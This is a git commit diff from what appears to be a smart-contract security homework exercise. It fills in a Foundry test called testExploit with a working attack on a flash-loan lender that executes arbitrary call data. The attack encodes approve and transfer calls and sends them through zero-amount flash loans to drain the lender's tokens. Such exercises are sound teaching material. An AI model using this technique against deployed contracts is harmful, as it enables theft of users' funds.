0a4f58fbd55823ee526ba3d2c9df39ddd8e39b90
Tzu-Hao Lin <haroldlin.0921@gmail.com>
2024-08-22 21:39:35 +0800

    stored

--- hw/test/Loan/BadCaller.t.sol
+++ hw/test/Loan/BadCaller.t.sol
@@ -11,6 +11,13 @@ import {BadCallerBaseTest} from "./BadCallerBase.t.sol";
 
 contract BadCallerTest is BadCallerBaseTest {
     function testExploit() external validation {
-        // TODO
+        // vm.startPrank(victim);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", msg.sender, lender.assets());
+        lender.flashLoan(msg.sender, 0, data);
+        data = abi.encodeWithSignature("transfer(address,uint256)", msg.sender, lender.assets());
+        lender.flashLoan(msg.sender, 0, data);
+        // console2.log("assets: %d", lender.assets());
+        // lender.loanToken.transfer(msg.sender, lender.assets());
+        // vm.stopPrank();
     }
 }
